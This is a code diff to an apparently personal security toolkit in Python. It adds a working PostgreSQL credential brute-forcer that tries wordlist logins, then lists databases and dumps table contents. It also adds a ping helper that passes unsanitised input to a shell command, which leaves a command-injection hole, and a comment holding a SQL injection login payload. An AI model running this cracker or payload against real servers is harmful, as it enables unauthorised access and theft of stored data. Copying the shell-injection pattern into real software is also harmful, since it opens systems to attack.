@@ -11,6 +11,8 @@ import zipfile
 import shutil
 import json
 import smtplib, ssl
+import platform
+import psycopg2
 
 from requests.api import head
 
@@ -360,9 +362,139 @@ class Examples:
             for id in pulse_ids:
                 f.write("\n".join([", ".join(k) for k in get_indicators(id)]))
                     
+    @staticmethod
+    def check_status(asset, type = "ping"):
+        if not type in ["ping", "http"]:
+            print("Type parameter is not valid!")
+            return
+
+        status = False
+
+        if type == "ping":
+            parameter = "-n" if platform.system().lower() == "windows" else "-c"
+            asset = asset.replace("http://","").replace("https://","")
+
+            r = subprocess.Popen(f"ping {parameter} 1 {asset}", shell=True, stdout=subprocess.PIPE)
+            r.wait()
+
+            status = True if r.returncode == 0 else False
+            r.terminate()
+
+        elif type == "http":
+            if asset[:7] != "http://" and asset[:8] != "https://":
+                asset = "http://" + asset
+            r = requests.get(asset)
+            status = True if r.status_code in [200,201,301,302] else False
+
+        if status:
+            print(f"'{asset}' is up.")
+        else:
+            print(f"'{asset}' is down!")
+
+    class PostgresCracker:
+
+        def __init__(self, hostname, user_wordlist, pass_wordlist, port=5432, default_db = "postgres"):
+            self.hostname = hostname
+            self.port = port
+            self.user_wordlist = user_wordlist
+            self.pass_wordlist = pass_wordlist
+            self.db_name = default_db
+
+            self.username = None
+            self.password = None
+            self.connection = None
+            self.databases = None
+
+        def _connect_db(self, _user, _pass, db_name = None):
+            try:
+                connection = psycopg2.connect(
+                    user = _user,
+                    password = _pass,
+                    host = self.hostname,
+                    port = str(self.port),
+                    database = self.db_name if not db_name else db_name
+                )
+                return connection
+            except psycopg2.OperationalError:
+                return None
+
+        def crack_credentials(self):
+            with open(self.user_wordlist) as userlist:
+                for user in userlist:
+                    user = user.strip()
+                    with open(self.pass_wordlist) as passlist:
+                        for passwd in passlist:
+                            passwd = passwd.strip()
+
+                            print(f"\rTrying '{user}':'{passwd}'".ljust(50), end="")
+                            con = self._connect_db(user, passwd)
+                            if con:
+                                self.username = user
+                                self.password = passwd
+                                self.connection = con
+                                print("\n\n--- CREDENTIALS ---")
+                                print(f"  USER: '{user}'\n  PASS: '{passwd}'")
+                                return
+
+        def list_databases(self):
+            if not self.connection:
+                print("You should crack credentials first!")
+                return
+
+            cursor = self.connection.cursor()
+            cursor.execute("SELECT datname FROM pg_database where datistemplate = false;")
+            self.databases = [k[0] for k in cursor.fetchall()]
+            cursor.close()
+
+            print("\n--- DATABASES ---")
+            print("  " + "\n  ".join(self.databases))
+
+        def change_database(self, db_name):
+            con = self._connect_db(self.username, self.password, db_name)
+            if con:
+                self.connection = con
+                print(f"\nDatabase changed to {db_name}")
+            else:
+                print(f"\nCould not connect to {db_name}")
+
+        def list_database_tables(self):
+            if not self.connection:
+                print("You should crack credentials first!")
+                return
+
+            cursor = self.connection.cursor()
+            cursor.execute("select table_catalog, table_schema, table_name from information_schema.tables where table_schema = 'public';")
+            tables = [k[2] for k in cursor.fetchall()]
+            cursor.close()
+
+            print("\n--- TABLES ---")
+            print("  " + "\n  ".join(tables))
+
+        def print_table_content(self, table_name):
+            if not self.connection:
+                print("You should crack credentials first!")
+                return
+
+            cursor = self.connection.cursor()
+            cursor.execute(f"""select * from "{table_name}";""")
+            colnames = [desc[0] for desc in cursor.description]
+            content = cursor.fetchall()
+            cursor.close()
+
+            print("\n--- TABLE CONTENT ---\n")
+
+            print(" ".join([k.ljust(15) for k in colnames]))
+            print(("-" * 15 + " ") * len(colnames))
+            for item in content:
+                print(" ".join([str(k).ljust(15) for k in item]))
 
 if __name__ == "__main__":
-    pass
+    cracker = Examples.PostgresCracker("localhost", "wordlists/wordlist.txt", "wordlists/wordlist.txt")
+    cracker.crack_credentials()
+    cracker.list_databases()
+    cracker.change_database("main")
+    cracker.list_database_tables()
+    cracker.print_table_content("user")
 
 """
 HASH Examples:
@@ -371,6 +503,11 @@ HASH Examples:
     SHA1    - secret     : e5e9fa1ba31ecd1ae84f75caaa474f3a663f05f4
     SHA256  - s3cr3tP4ss : c2d67b9da146fa195d293d37a8307b6f1bb16ae64c0112d974f02f2083d7a689
     SHA512  - s3cr3tP4ss : 69cff7f633bd375d73f244e072d8934b8de7666a0a2db77fb10ae9cb90a66e07c4f0eb27699caf1664c638cebeeafe79fb9df1f16bfb2864369e010d944801df
+"""
+
+"""
+    SQL Injection Payload : 
+        admin' OR 1 = 1; -- -'
 """
 
 """
